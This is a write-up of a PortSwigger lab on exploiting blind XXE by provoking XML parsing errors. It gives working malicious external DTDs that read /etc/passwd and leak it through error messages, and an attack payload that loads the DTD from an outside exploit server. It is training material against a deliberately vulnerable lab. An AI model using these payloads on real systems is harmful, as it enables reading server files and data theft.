# Exploiting blind XXE to retrieve data via error messages

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

## Definition
An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD carries out the following steps:

- Defines an XML parameter entity called file, containing the contents of the `/etc/passwd` file.
- Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
- Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
- Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

Invoking the malicious external DTD will result in an error message like the following:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Notes
This lab has a `Check stock` feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

**Original Request**
```http
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>5</productId><storeId>1</storeId></stockCheck>
```

**Malicious External DTD**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY &#x25; invoke SYSTEM 'file:///abc/%file;'>">
%wrapper;
%invoke;
```

**Malicious Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [
    <!ENTITY % lookup SYSTEM "https://exploit-0a0100930372ad83c0b8120a0157008e.web-security-academy.net/exploit">
    %lookup;
]>
<stockCheck>
    <productId>5</productId>
    <storeId>1</storeId>
</stockCheck>
```

## Key Words
> xml, xxe, error, exfiltrate, entity